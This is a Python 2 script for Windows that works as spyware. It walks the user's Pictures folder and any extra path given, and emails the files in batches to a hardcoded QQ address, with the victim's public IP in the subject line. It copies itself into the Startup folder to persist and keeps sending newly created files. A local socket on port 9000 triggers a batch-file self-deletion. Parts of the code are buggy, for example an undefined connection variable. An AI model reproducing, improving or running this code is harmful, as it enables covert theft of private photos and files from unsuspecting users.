#encoding=utf-8
#default is windows os

#given the default dir is Pictures

import os
import re
import time
import socket
import sys
import logging
import threading
import shutil
import socket
import thread
import select
import subprocess
from urllib2 import urlopen

from multiprocessing import Process
from threading import Semaphore

import email_client
import files_filter
import config_utils
import http_server

current_public_ip = urlopen('http://ip.42.pl/raw').read()
current_inner_ip = socket.gethostbyname(socket.gethostname())
current_time = time.strftime("%Y-%m-%d %H:%M:%S")

logging.basicConfig(
    filename="%s.log"%time.strftime("%Y-%m-%d %H-%M-%S"),
    format='%(asctime)s %(levelname)s %(message)s',
    level=logging.INFO)

logging.getLogger().addHandler(logging.StreamHandler())
sys_status = True
condition = threading.Condition()


ATTACHMENT_SIZE = 2

target_email = "848334436@qq.com"
subject = "From %s computer" %current_public_ip
content = current_time +"\r %s" %current_inner_ip

current_time = time.strftime("%Y-%m-%d %H:%M:%S")

sys_init_time = 0
last_send_time = 0
execute_time = 15 #one day to execute

#test passed
def _add_to_startup():
    try:

        pic_path = os.path.join(os.path.expandvars("%userprofile%"),
                "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
        shutil.copy2(os.getcwd() +'/'+ os.path.splitext(__file__)[0] + ".exe",\
                    pic_path + os.path.splitext(__file__)[0] + ".exe")
        logging.info("Add to startup successly")
        return True
    except Exception as e:
        logging.info("Add to startup faild ")
        logging.error(e)
        return False

def _delete_exe():
    exe_path = os.path.join(os.path.expandvars("%userprofile%"),\
            "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
    #exe_path += os.path.splitext(__file__)[0] + ".exe"
    exe_path += os.path.splitext(__file__)[0] + ".exe"

    with open(exe_path + 'protect.bat','w') as f:
        #delay 5s to delete the exe file
        f.write("@ping 127.0.0.1 -n 5 -w 1000 > nul\n")
        #if the path contains space, add "your path"
        f.write('del "%s"\n' %exe_path)
        f.close()
    p = subprocess.Popen(exe_path + 'protect.bat', creationflags=subprocess.CREATE_NEW_CONSOLE)
    logging.info("Clean up!")

class SocketServer(threading.Thread):
    """docstring for SocketServer"""
    def __init__(self):
        super(SocketServer, self).__init__()
    def run(self):
        global condition
        logging.info('---------socket_server start-------------')
        #print '---------socket_server start-------------'
        HOST = '127.0.0.1'
        PORT = 9000
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((HOST,PORT))
        s.listen(1)
        flag = True
        global sys_status
        count = 0
        try:
            while sys_status:
                if condition.acquire():
                    start_time = time.time()
                    flag += 1
                    #logging.info("ss while loop %s" %flag)
                    infds,outfds,errfds = select.select([s,],[],[],2)
                    logging.info("selects")
                    if len(infds) !=0:
                        sys_status = False
                        _delete_exe()
                        conn.sendall("Success Deleted!")
                        logging.info("System End!")
                        flag = False
                        s.close()
                        condition.wait()
                    else:
                        if time.time() - start_time > 1:
                            condition.notify()
                condition.release()
                time.sleep(2)
        except KeyboardInterrupt:
            sys.exit()



#test passed
def _init(pic_path, config_location):
    logging.info("------------------------------------")
    logging.info("System initing....\r")

    logging.info("System init will start in 5 s")
    time.sleep(5)
    #write_notation()

    files_list = []
    current_files_size = 0
    attachment_size = 0

    for path in pic_path:
        logging.info("Working dir is %s" %path)
        for root, dirs, files in os.walk(path):
            for name in files:
                full_name = root + '/' + name
                logging.info("File %s add to list" %full_name)
                files_list.append(full_name)

                attachment_size += 1
                #transfer to MB
                current_files_size += files_filter.get_file_mb_size(full_name)

                #if the current files size bigger than 20MB It will send and files_list will init to []
                if current_files_size <=20:
                    if attachment_size == ATTACHMENT_SIZE:
                        logging.warning("FILE SIZE LIMIT %s AND WILL SEND"%attachment_size)
                        logging.info("SEND %s" %files_list)
                        email_client.mail(target_email,
                           subject,
                           content,
                           files_list)
                        logging.info("System pause for 5 seconds")
                        time.sleep(5)
                        files_list = []
                        current_files_size = 0
                        attachment_size = 0
    if files_list != []:  #to avoid email without attachment
        email_client.mail(target_email,
               subject,
               content,
               files_list)

    sys_init_time = time.time()
    global last_send_time
    last_send_time = sys_init_time

    config_utils._update_config(config_location,'filesys','is_first_time','false')
    if _add_to_startup():
        logging.info("System initing send time %s" %last_send_time)
        logging.info("System inited at %s." %time.strftime("%Y-%m-%d %H:%M:%S"))
        logging.info("System init end")
        logging.info("------------------------------------")
    else:
        logging.info("System init faild! Add to startup failed")
#test passed. But not well
def _single_file_monitor(f):
    global last_send_time

    if last_send_time == 0:
        return False
    f_create_time = time.mktime(time.strptime(time.ctime(os.path.getctime(f)),"%a %b %d %H:%M:%S %Y"))
    if (f_create_time - last_send_time) > 0:

        logging.info("Check File Success. Will Send")
        return True
    else:
        return False
class PicSend(threading.Thread):
    """docstring for PicSend"""
    def __init__(self, pic_path):
        super(PicSend, self).__init__()
        self.pic_path = pic_path
    def run(self):
        send_times = 0

        global last_send_time
        global sys_status
        global condition

        current_files_size = 0
        attachment_size = 0
        while sys_status:
            if condition.acquire():
                self._monitor_files(self.pic_path,
                                    current_files_size,
                                    attachment_size,
                                    send_times,
                                    condition)

            else:
                condition.wait()
            condition.release()
            time.sleep(2)
    def _monitor_files(self,
                        pic_path,
                        current_files_size,
                        attachment_size,
                        send_times,
                        condition):
        updated_files = []
        files_list = []

        for path in pic_path:
            #get all files in path
            for root, dirs, files in os.walk(path):
                for name in files:
                    full_name = root + '/' + name
                    files_list.append(full_name)

            #check the files in list are the newest!
            #print files_list
            for f_name in files_list:
                if _single_file_monitor(f_name):
                    updated_files.append(f_name)
                    #logging.info("File %s are the new!")%f_name
                    attachment_size += 1
                    current_files_size += files_filter.get_file_mb_size(full_name)

                    if updated_files == []:
                        logging.info("Entering wait condition")
                        #condition.notify()

                    elif attachment_size == ATTACHMENT_SIZE and updated_files != []:

                        logging.warning("FILE SIZE LIMIT %s AND WILL SEND"%attachment_size)
                        email_client.mail(target_email,
                           subject,
                           content,
                           updated_files)

                        updated_files = []
                        current_files_size = 0
                        attachment_size = 0
                        send_times += 1
                        last_send_time = time.time()
                        logging.info("File sent at %s " %time.ctime())
                else:
                    logging.info("File %s will not be sent twice" %f_name)
                    condition.notify()


            if updated_files!= []:
                email_client.mail(target_email,
                                    subject,
                                    content,
                                    updated_files)
                send_times += 1
                last_send_time = time.time()
                logging.info("File sent at %s " %time.ctime())

        logging.info("System has sent %s mails" %send_times)

def path_check(path):

    while not os.path.exists(path):
        if not os.path.isdir(path):
            path = raw_input("We need a DIR! Not a File!")
        else:
            path = raw_input("Path Not Exist Please Input again\n")
    return path

if __name__ == '__main__':
    try:
        pic_path = os.path.join(os.path.expandvars("%userprofile%"),"Pictures")
        handle_path = []
        handle_path.append(pic_path)
        user_path = ''

        try:
            user_path = sys.argv[1]
            handle_path.append(path_check(sys.argv[1]))
            logging.info("user path add ====>%s" % user_path)
        except Exception as e:
            logging.info(e)
            logging.info("using default path")
            print u"使用默认路径".encode('gbk')
        exe_path = os.path.join(os.path.expandvars("%userprofile%"),
                "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
        config_location = exe_path + 'config.cfg'

        info, is_first_time = config_utils._read_config(config_location)
        logging.info(info)


        running_semaphore = Semaphore(1)
        ss_semaphore = Semaphore(0)
        if is_first_time:
            config_utils._init_config(config_location)
            _init(handle_path,config_location)

        run = PicSend(handle_path)
        run.start()
        ss = SocketServer()
        ss.start()
    except KeyboardInterrupt:
        sys.exit()
